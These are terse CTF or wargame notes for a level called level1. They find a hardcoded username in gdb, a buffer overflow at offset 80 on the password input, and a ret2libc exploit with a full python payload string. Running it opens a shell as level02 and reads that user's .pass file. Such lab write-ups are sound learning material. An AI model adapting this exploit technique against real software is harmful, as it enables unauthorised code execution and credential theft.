pgm asks for username
fgets -> username

we can gdb and x/s the address compared, it is "dat_wil"

it works

pgm asks for password
fgets -> password

we can gdb and x/s the address compared, it is "admin"
doesn't work...

we can overflow in eip on password's fgets, offset is 80

ret2libc attack

we can find address of system call, of exit call, and the one of "/bin/sh"
-> 'info function xxx', 'info proc map' + 'find start_address, end_address, "/bin/sh"'

chmod 777 .
touch exploit
chmod 777 exploit
python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' > exploit
cat exploit - | ./level1

we are inside shell as level02
we can cat level02's .pass
